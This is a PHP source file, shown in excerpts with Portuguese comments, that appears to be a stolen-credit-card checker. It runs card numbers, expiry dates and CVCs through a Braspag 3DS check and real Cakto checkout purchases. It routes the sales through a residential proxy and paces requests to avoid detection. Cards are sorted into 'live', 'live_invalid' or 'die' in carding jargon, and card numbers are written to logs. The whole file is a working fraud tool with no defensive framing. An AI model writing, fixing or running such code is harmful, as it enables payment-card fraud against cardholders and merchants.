...
$pdo = null;
$user_key = 'lite';
// stubs p/ manter o fluxo de testar identico ao da versao completa
...
// Proxy BrightData (residencial BR) - usado so no POST de venda de cards nao-3DS
    ...
    if ($fp) {
        ...
        if (is_array($j) && !empty($j['token']) && isset($j['ts']) && (time() - (int)$j['ts']) < $TTL) {
            ...
            if ($r['code'] === 200) {
                ...
                dlog('3DS token HTTP ' . $r['code'] . ' ' . $r['err']);
            }
            if ($tok) {
                ftruncate($fp, 0);
                rewind($fp);
...
function enrollSpacing() {
    ...
    if ($wait > 0) {
        ...
        dlog('3DS enroll spacing: aguardando ' . $wait . 's');
        sleep($wait);
        return;
    }
...
function verificar3ds($card, $productId, $amount) {
    $tok = get3dsToken();
    if (!$tok) { dlog('3DS: token indisponivel card=' . $card['numero']); return null; }
    enrollSpacing();
    ...
    if ($init['code'] !== 200 || !is_array($dInit) || empty($dInit['Token'])) {
        return null;
    }
    ...
    switch ($st) {
        ...
        case 'VALIDATION_NEEDED':
            ...
            return ['status' => 'DIE', 'rc' => 'DIE', 'msg' => '3DS nao autenticado'];
        case 'NOT_ENROLLED':
            return ['status' => 'NOT_ENROLLED', 'rc' => 'DIE', 'msg' => 'Nao habilitado para 3DS'];
        default:
            return ['status' => 'DIE', 'rc' => 'DIE', 'msg' => $dEnr['ReturnMessage'] ?? 'Cartao nao suportado para 3DS'];
    }
}
...
function criarVenda($offerId, $shortId, $productId, $card, $installments) {
    ...
    dlog("POST /api/checkout/$shortId/ card={$card['numero']}");
    $r = curlJson(CAKTO_BASE . "/api/checkout/$shortId/", 'POST', $json);
    dlog("  HTTP {$r['code']} err={$r['err']} resp=" . substr($r['body'], 0, 300));
    return $r;
}

function classificar($resp) {
    $p = $resp['payments'][0] ?? null;
    if (!$p) return ['status' => 'die', 'rc' => 'RC_NA', 'msg' => 'Sem resposta de pagamento [CAKTO]', 'gateway' => 'cakto'];

    $st = strtolower($p['status'] ?? '');
    $threeDs = $p['threeDs'] ?? null;
    $nextStep = $p['nextStep'] ?? null;
    $returnCode = $p['return_code'] ?? $p['acquirer_return_code'] ?? $p['gatewayResponseCode'] ?? 'ERRO';
    $reason = $p['reason'] ?? $p['message'] ?? $p['acquirer_message'] ?? 'Pagamento recusado';

    // Aprovado
    if ($st === 'approved' || $st === 'captured') {
        return ['status' => 'live_invalid', 'rc' => $returnCode, 'msg' => 'APROVADO (' . $returnCode . ')', 'gateway' => 'cakto'];
    }

    // 3DS / pendente
    if ($threeDs || (stripos((string)$nextStep, '3ds') !== false) || stripos((string)$nextStep, '3d') === 0) {
        return ['status' => 'live', 'rc' => $returnCode, 'msg' => 'LIVE 3DS / VBV (' . $returnCode . ')', 'gateway' => 'cakto'];
    }

    if (in_array($st, ['pending', 'processing', 'waiting_payment'])) {
        if ($nextStep || $threeDs) {
            return ['status' => 'live', 'rc' => $returnCode, 'msg' => 'LIVE 3DS (' . $returnCode . ')', 'gateway' => 'cakto'];
        }
    }

    // Recusado com exibição detalhada do código (51, 54, 82, etc.)
    $msgFinal = trim($reason);
    return [
        'status' => 'die', 
        'rc' => $returnCode, 
        'msg' => "$msgFinal - Código: $returnCode", 
        'gateway' => 'cakto'
    ];
}
...
switch ($action) {
    case 'testar':
        ...
        // Mantém a trava focada em cartões de 16 dígitos
        ...
        // Passo 1: Verificação 3DS (MPI/Braspag)
        ...
        // --- Passo 2: Se não passou no 3DS, continua para o POST de venda da Cakto (Captura códigos 51, 54, 82, etc.) ---
        $r = criarVenda($offerId, $prod['short_id'], $prod['id'], $card, $installments);

        if ($r['code'] !== 200 || empty($r['body'])) {
            jsonResp([
                'card' => $numero, 'exp' => $parts[1] . substr($parts[2], -2), 'cvc' => $parts[3],
                'status' => 'die', 'rc' => 'RC_NA', 'msg' => 'HTTP ' . $r['code'] . ' - Erro de conexão', 'gateway' => 'cakto'
            ]);
        }
        ...
        if (!is_array($resp)) {
            jsonResp([
                'card' => $numero, 'exp' => $parts[1] . substr($parts[2], -2), 'cvc' => $parts[3],
                'status' => 'die', 'rc' => 'RC_NA', 'msg' => 'Resposta inválida da API', 'gateway' => 'cakto'
            ]);
        }

        $class = classificar($resp);
        
        // Regra para forçar códigos específicos de adquirente a se comportarem como LIVE caso necessário
        $rc = (string)$class['rc'];
        if (in_array($rc, ['00', '10'])) {
            $class['status'] = 'live_invalid';
            $class['msg'] = "APROVADO ($rc)";
        }
